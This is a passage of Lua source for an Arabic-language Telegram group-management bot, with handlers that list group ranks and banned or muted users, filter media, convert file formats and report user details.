local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تثبيت الرساله بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙البوت ليس ادمن هنا !', 1, 'md')
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات', 1, 'md')
return false  
end
end,nil)
end 
end
--     Source LanZo     --
if Admin(msg) then
if text == "المميزين" and ChCheck(msg) then 
local List = DevaMeR:smembers(LanZo..'aMeR:VipMem:'..msg.chat_id_)
text = "᥀︙قائمة المميزين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevaMeR:get(LanZo..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "᥀︙*لا يوجد مميزين*"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source LanZo     --
if Manager(msg) then
if text == "الادمنيه" and ChCheck(msg) or text == "الادمنية" and ChCheck(msg) then 
local aMeR =  'aMeR:Admins:'..msg.chat_id_
local List = DevaMeR:smembers(LanZo..aMeR)
text = "᥀︙قائمة الادمنيه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevaMeR:get(LanZo..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "᥀︙*لا يوجد ادمنيه*"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end
--     Source LanZo     -- 
if Constructor(msg) then
if text == "المدراء" and ChCheck(msg) or text == "مدراء" and ChCheck(msg) then 
local List = DevaMeR:smembers(LanZo..'aMeR:Managers:'..msg.chat_id_)
text = "᥀︙قائمة المدراء ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevaMeR:get(LanZo..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "᥀︙*لا يوجد مدراء*"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "المنظفين" and ChCheck(msg) then 
local List = DevaMeR:smembers(LanZo..'aMeR:Cleaner:'..msg.chat_id_)
text = "᥀︙قائمة المنظفين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevaMeR:get(LanZo..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "᥀︙*لا يوجد منظفين*"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source LanZo     --
if BasicConstructor(msg) then
if text == "المنشئين" and ChCheck(msg) then 
local List = DevaMeR:smembers(LanZo..'aMeR:Constructor:'..msg.chat_id_)
text = "᥀︙قائمة المنشئين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevaMeR:get(LanZo..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "᥀︙*لا يوجد منشئين*"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source LanZo     --
if Owner(msg) then
if text == "المالكين" and ChCheck(msg) then 
local List = DevaMeR:smembers(LanZo..'aMeR:Owner:'..msg.chat_id_)
text = "᥀︙قائمة المالكين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevaMeR:get(LanZo..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "᥀︙*لا يوجد مالكين*"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "المنشئين الاساسيين" and ChCheck(msg) or text == "منشئين اساسيين" and ChCheck(msg) or text == "المنشئين الاساسين" and ChCheck(msg) then 
local List = DevaMeR:smembers(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_)
text = "᥀︙قائمة المنشئين الاساسيين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevaMeR:get(LanZo..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "᥀︙*لا يوجد منشئين اساسيين*"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end 
if text ==("المنشئ") and ChCheck(msg) or text ==("المالك") and ChCheck(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙حساب المنشئ محذوف", 1, "md")
return false  
end
local UserName = (dp.username_ or "Bw5Bw")
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙مالك المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md")  
end,nil)   
end
end
end,nil)   
end
--     Source LanZo     --
if Admin(msg) then
if text == "المكتومين" and ChCheck(msg) then 
local List = DevaMeR:smembers(LanZo..'aMeR:Muted:'..msg.chat_id_)
text = "᥀︙قائمة المكتومين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevaMeR:get(LanZo..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "᥀︙*لا يوجد مكتومين*"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source LanZo     --
if text == "المقيدين" and ChCheck(msg) then 
local List = DevaMeR:smembers(LanZo..'aMeR:Tkeed:'..msg.chat_id_)
text = "᥀︙قائمة المقيدين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevaMeR:get(LanZo..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "᥀︙*لا يوجد مقيدين*"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source LanZo     --
if text == "المحظورين" and ChCheck(msg) or text == "المحضورين" and ChCheck(msg) then 
local List = DevaMeR:smembers(LanZo..'aMeR:Ban:'..msg.chat_id_)
text = "᥀︙قائمة المحظورين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevaMeR:get(LanZo..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "᥀︙*لا يوجد محظورين*"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source LanZo     --
if text == "المطايه" and ChCheck(msg) or text == "المطاية" and ChCheck(msg) then
local List = DevaMeR:smembers(LanZo..'User:Donky:'..msg.chat_id_)
text = "᥀︙قائمة مطاية المجموعه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevaMeR:get(LanZo..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "᥀︙*لا يوجد مطايه كلها اوادم*"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source LanZo     --
if text == "قائمه المنع" and ChCheck(msg) then
local List = DevaMeR:hkeys(LanZo..'aMeR:Filters:'..msg.chat_id_)
text = "᥀︙قائمة المنع ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k, v in pairs(List) do
text = text..k..'~ ❨ '..v..' ❩\n'
end
if #List == 0 then
text = "᥀︙لا توجد كلمات ممنوعه"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
end 
--     Source LanZo     --
if text == "المطورين الاساسيين" and ChCheck(msg) and aMeRSudo(msg) or text == "الاساسيين" and aMeRSudo(msg) and ChCheck(msg) or text == "↫ الاساسيين ᥀" and aMeRSudo(msg) and ChCheck(msg) then 
local List = DevaMeR:smembers(LanZo..'aMeR:aMeRSudo:')
text = "᥀︙قائمة المطورين الاساسيين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevaMeR:get(LanZo..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "᥀︙*عذرا لم يتم رفع اي مطورين اساسيين*"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source LanZo     --
if text == "المطورين الثانويين" and SecondSudo(msg) and ChCheck(msg) or text == "الثانويين" and SecondSudo(msg) and ChCheck(msg) or text == "↫ الثانويين ᥀" and SecondSudo(msg) and ChCheck(msg) then 
local List = DevaMeR:smembers(LanZo..'aMeR:SecondSudo:')
text = "᥀︙قائمة المطورين الثانويين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevaMeR:get(LanZo..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "᥀︙*عذرا لم يتم رفع اي مطورين ثانويين*"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source LanZo     --
if SudoBot(msg) then
if text == "قائمه العام" and ChCheck(msg) or text == "المحظورين عام" and ChCheck(msg) or text == "المكتومين عام" and ChCheck(msg) or text == "↫ قائمه العام ᥀" and ChCheck(msg) or text == "↫ قائمه العام ᥀" and ChCheck(msg) then 
local BanAll = DevaMeR:smembers(LanZo..'aMeR:BanAll:')
local MuteAll = DevaMeR:smembers(LanZo..'aMeR:MuteAll:')
if #BanAll ~= 0 then 
text = "᥀︙قائمة المحظورين عام ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(BanAll) do
local username = DevaMeR:get(LanZo..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
else
text = ""
end
if #MuteAll ~= 0 then 
text = text.."᥀︙قائمة المكتومين عام ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(MuteAll) do
local username = DevaMeR:get(LanZo..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
else
text = text
end
if #BanAll ~= 0 or #MuteAll ~= 0 then 
text = text
else
text = "᥀︙*لم يتم حظر او كتم اي عضو*"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source LanZo     --
if text == "المطورين" and ChCheck(msg) or text == "↫ المطورين ᥀" and ChCheck(msg) then 
local List = DevaMeR:smembers(LanZo..'aMeR:SudoBot:')
text = "᥀︙قائمة المطورين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local sudouser = DevaMeR:get(LanZo..'aMeR:Sudos'..v) 
local username = DevaMeR:get(LanZo..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."] ↬ Gps : "..(sudouser or 0).."\n"
else
text = text..k.."~ : `"..v.."` ↬ Gps : "..(sudouser or 0).."\n"
end end
if #List == 0 then
text = "᥀︙*عذرا لم يتم رفع اي مطورين*"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source LanZo     --
if text ==("رفع المنشئ") and ChCheck(msg) or text ==("رفع المالك") and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙حساب المنشئ محذوف", 1, "md")
return false  
end
local UserName = (dp.username_ or "Bw5Bw")
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم رفع مالك المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md") 
DevaMeR:sadd(LanZo.."aMeR:aMeRConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
--     Source LanZo     --
if Manager(msg) then
if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
function filter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevaMeR:sadd(LanZo.."aMeR:FilterSteckr"..msg.chat_id_,idsticker)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم منع الملصق بنجاح لن يتم ارساله مجددا', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevaMeR:sadd(LanZo.."aMeR:FilterPhoto"..msg.chat_id_,photo)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم منع الصوره بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
if result.content_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevaMeR:sadd(LanZo.."aMeR:FilterAnimation"..msg.chat_id_,idanimation)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم منع المتحركه بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,filter_by_reply) 
end
--     Source LanZo     --
if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then     
function unfilter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevaMeR:srem(LanZo.."aMeR:FilterSteckr"..msg.chat_id_,idsticker)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevaMeR:srem(LanZo.."aMeR:FilterPhoto"..msg.chat_id_,photo)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevaMeR:srem(LanZo.."aMeR:FilterAnimation"..msg.chat_id_,idanimation)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء منع المتحركه يمكنهم ارسالها الان', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unfilter_by_reply) 
end
end
--     Source LanZo     --
if text and (text == "تفعيل تحويل الصيغ" or text == "تفعيل التحويل") and Manager(msg) and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل تحويل الصيغ'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Thwel:aMeR'..msg.chat_id_) 
end
if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and Manager(msg) and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل تحويل الصيغ'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Thwel:aMeR'..msg.chat_id_,true)  
end
if text == 'تحويل' and not DevaMeR:get(LanZo..'aMeR:Thwel:aMeR'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
function ThwelByReply(extra, result, success)
if result.content_.photo_ then 
local aMeR = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.photo_.sizes_[1].photo_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..aMeR.result.file_path,msg.sender_user_id_..'.png') 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.png')
os.execute('rm -rf ./'..msg.sender_user_id_..'.png') 
end   
if result.content_.sticker_ then 
local aMeR = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.sticker_.sticker_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..aMeR.result.file_path,msg.sender_user_id_..'.jpg') 
sendPhoto(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.jpg','᥀︙تم تحويل الملصق الى صوره')     
os.execute('rm -rf ./'..msg.sender_user_id_..'.jpg') 
end
if result.content_.audio_ then 
local aMeR = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.audio_.audio_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..aMeR.result.file_path,msg.sender_user_id_..'.ogg') 
sendVoice(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.ogg',"᥀︙تم تحويل الـMp3 الى بصمه")
os.execute('rm -rf ./'..msg.sender_user_id_..'.ogg') 
end   
if result.content_.voice_ then 
local aMeR = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.voice_.voice_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..aMeR.result.file_path,msg.sender_user_id_..'.mp3') 
sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.mp3')  
os.execute('rm -rf ./'..msg.sender_user_id_..'.mp3') 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ThwelByReply) 
end
end
--     Source LanZo     --
if text ==("كشف") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) or text ==("ايدي") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then 
function id_by_reply(extra, result, success) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevaMeR:get(LanZo..'aMeR:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(DevaMeR:get(LanZo..'aMeR:GamesNumber'..msg.chat_id_..data.id_) or 0)
if DevaMeR:sismember(LanZo..'aMeR:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevaMeR:sismember(LanZo..'aMeR:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif DevaMeR:sismember(LanZo..'aMeR:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevaMeR:sismember(LanZo..'aMeR:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevaMeR:sismember(LanZo..'aMeR:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n᥀︙القيود ↫ '..Tkeed
else 
Tked = '' 
end
if DevaMeR:sismember(LanZo..'aMeR:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevaMeR:get(LanZo..'aMeR:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(result.sender_user_id_,msg.chat_id_) ~= false then
CustomTitle = '\n᥀︙لقبه ↫ '..GetCustomTitle(result.sender_user_id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '᥀︙اسمه ↫ ['..data.first_name_..'](tg://user?id='..result.sender_user_id_..')\n᥀︙ايديه ↫ ❨ `'..result.sender_user_id_..'` ❩\n᥀︙رتبته ↫ '..IdRank(result.sender_user_id_, msg.chat_id_)..sudobot..'\n᥀︙رسائله ↫ ❨ '..user_msgs..' ❩\n᥀︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n᥀︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙معرفه ↫ [@'..data.username_..']\n᥀︙ايديه ↫ ❨ `'..result.sender_user_id_..'` ❩\n᥀︙رتبته ↫ '..IdRank(result.sender_user_id_, msg.chat_id_)..sudobot..'\n᥀︙رسائله ↫ ❨ '..user_msgs..' ❩\n᥀︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n᥀︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end
end,nil)
end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
end
if text and text:match('^كشف @(.*)') and ChCheck(msg) or text and text:match('^ايدي @(.*)') and ChCheck(msg) then 
local username = text:match('^كشف @(.*)') or text:match('^ايدي @(.*)')
tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙*المعرف غير صحيح*', 1, 'md')
return false  end
if res.type_.ID == "ChannelChatInfo" then 
if res.type_.channel_.is_supergroup_ == false then
local ch = 'قناة'
local chn = '᥀︙نوع الحساب ↫ ❨ '..ch..' ❩\n᥀︙الايدي ↫ ❨ `'..res.id_..'` ❩\n᥀︙المعرف ↫ ❨ [@'..username..'] ❩\n᥀︙الاسم ↫ ❨ ['..res.title_..'] ❩'
Dev_aMeR(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'مجموعه'
local grr = '᥀︙نوع الحساب ↫ ❨ '..gr..' ❩\n᥀︙الايدي ↫ ❨ '..res.id_..' ❩\n᥀︙المعرف ↫ ❨ [@'..username..'] ❩\n᥀︙الاسم ↫ ❨ ['..res.title_..'] ❩'
Dev_aMeR(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
local user_msgs = DevaMeR:get(LanZo..'aMeR:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(DevaMeR:get(LanZo..'aMeR:GamesNumber'..msg.chat_id_..res.id_) or 0)
if DevaMeR:sismember(LanZo..'aMeR:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif DevaMeR:sismember(LanZo..'aMeR:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif DevaMeR:sismember(LanZo..'aMeR:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevaMeR:sismember(LanZo..'aMeR:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevaMeR:sismember(LanZo..'aMeR:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n᥀︙القيود ↫ '..Tkeed
else 
Tked = '' 
end
if DevaMeR:sismember(LanZo..'aMeR:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevaMeR:get(LanZo..'aMeR:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(res.id_,msg.chat_id_) ~= false then
CustomTitle = '\n᥀︙لقبه ↫ '..GetCustomTitle(res.id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙الحساب محذوف', 1, 'md')
return false  end
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙معرفه ↫ [@'..data.username_..']\n᥀︙ايديه ↫ ❨ `'..res.id_..'` ❩\n᥀︙رتبته ↫ '..IdRank(res.id_, msg.chat_id_)..sudobot..'\n᥀︙رسائله ↫ ❨ '..user_msgs..' ❩\n᥀︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n᥀︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end,nil)
end 
end,nil)
return false 
end
if text and text:match('كشف (%d+)') and ChCheck(msg) or text and text:match('ايدي (%d+)') and ChCheck(msg) then 
local iduser = text:match('كشف (%d+)') or text:match('ايدي (%d+)')  
tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
if data.message_ == "User not found" then
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لم يتم التعرف على الحساب', 1, 'md')
return false  
end
local user_msgs = DevaMeR:get(LanZo..'aMeR:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(DevaMeR:get(LanZo..'aMeR:GamesNumber'..msg.chat_id_..iduser) or 0)
if DevaMeR:sismember(LanZo..'aMeR:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DevaMeR:sismember(LanZo..'aMeR:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DevaMeR:sismember(LanZo..'aMeR:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevaMeR:sismember(LanZo..'aMeR:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevaMeR:sismember(LanZo..'aMeR:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n᥀︙القيود ↫ '..Tkeed
else 
Tked = '' 
end
if DevaMeR:sismember(LanZo..'aMeR:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevaMeR:get(LanZo..'aMeR:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(iduser,msg.chat_id_) ~= false then
CustomTitle = '\n᥀︙لقبه ↫ '..GetCustomTitle(iduser,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '᥀︙اسمه ↫ ['..data.first_name_..'](tg://user?id='..iduser..')\n᥀︙ايديه ↫ ❨ `'..iduser..'` ❩\n᥀︙رتبته ↫ '..IdRank(data.id_, msg.chat_id_)..sudobot..'\n᥀︙رسائله ↫ ❨ '..user_msgs..' ❩\n᥀︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n᥀︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙معرفه ↫ [@'..data.username_..']\n᥀︙ايديه ↫ ❨ `'..iduser..'` ❩\n᥀︙رتبته ↫ '..IdRank(data.id_, msg.chat_id_)..sudobot..'\n᥀︙رسائله ↫ ❨ '..user_msgs..' ❩\n᥀︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n᥀︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end
end,nil)
return false 
end 
--     Source LanZo     --
if text == 'كشف القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function kshf_by_reply(extra, result, success)
if DevaMeR:sismember(LanZo..'aMeR:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevaMeR:sismember(LanZo..'aMeR:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevaMeR:sismember(LanZo..'aMeR:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevaMeR:sismember(LanZo..'aMeR:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
